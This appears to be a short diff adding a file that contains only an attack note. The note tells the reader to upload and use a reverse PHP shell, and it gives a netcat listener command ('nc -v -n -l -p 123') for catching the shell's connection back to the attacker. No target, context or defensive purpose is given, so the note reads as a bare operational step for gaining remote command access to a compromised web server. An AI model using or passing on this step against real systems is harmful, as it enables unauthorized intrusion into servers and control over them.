@@ -1,0 +1,9 @@
+
+
+
+Upload and use reverse php shell:
+nc -v -n -l -p 123
+
+
+
+
